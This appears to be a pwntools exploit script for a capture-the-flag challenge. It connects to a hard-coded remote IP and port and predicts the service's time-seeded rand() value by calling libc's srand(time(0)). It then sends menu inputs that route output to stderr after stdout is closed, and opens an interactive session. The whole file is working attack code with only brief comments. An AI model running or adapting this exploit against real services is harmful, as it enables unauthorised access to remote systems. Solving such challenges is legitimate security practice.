from pwn import*
import ctypes
context(os='linux', arch='amd64')
#io=process('./pwn')
#
io=connect('47.97.58.52',40003)
elf=ELF('./pwn')
libc=ELF("./libc.so.6") 
 
elf1=ctypes.CDLL("./libc.so.6")
elf1.srand(elf1.time(0))    #与题目相同以时间为种子
sleep(1)
#io.recvuntil('turn!\n')
io.sendline('0')	#read
sleep(1)
pl = str(elf1.rand()%100+3)
io.sendline(pl)

sleep(1)
io.sendline('1')	#write
io.sendline('2')	#due to close(1); before, so use '2' to print to stderr
io.recvline()
io.interactive()
